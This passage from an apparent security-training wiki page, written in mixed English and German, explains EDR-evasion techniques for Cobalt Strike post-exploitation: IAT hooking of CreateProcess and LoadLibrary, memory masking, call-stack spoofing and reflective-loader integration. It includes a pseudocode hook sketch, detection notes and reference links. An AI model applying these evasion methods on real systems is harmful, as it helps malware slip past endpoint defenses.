- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notizen
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bauen eine gefälschte Aufrufkette (return addresses in harmlose Module) und pivotieren dann in die echte API.
- Das umgeht Erkennungen, die kanonische Stacks von Beacon/BOFs zu sensiblen APIs erwarten.
- Mit stack cutting/stack stitching Techniken kombinieren, um vor der API‑Prolog erwartete Frames zu erreichen.

Operationale Integration
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Erkennung/DFIR‑Überlegungen
- IAT integrity: Einträge, die zu non‑image (heap/anon) Adressen auflösen; periodische Verifikation von import pointers.
- Stack anomalies: return addresses, die nicht zu geladenen Images gehören; abrupte Übergänge zu non‑image PIC; inkonsistente RtlUserThreadStart‑Abstammung.
- Loader telemetry: In‑Process‑Schreibvorgänge an der IAT, frühe DllMain‑Activity, die import thunks modifiziert, unerwartete RX‑Regionen, die beim Laden erstellt werden.
- Image‑load evasion: Falls hooking von LoadLibrary* stattfindet, suspicious loads von automation/clr assemblies überwachen, die mit memory masking Events korrelieren.

Verwandte Bausteine und Beispiele
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) und stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## Referenzen

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
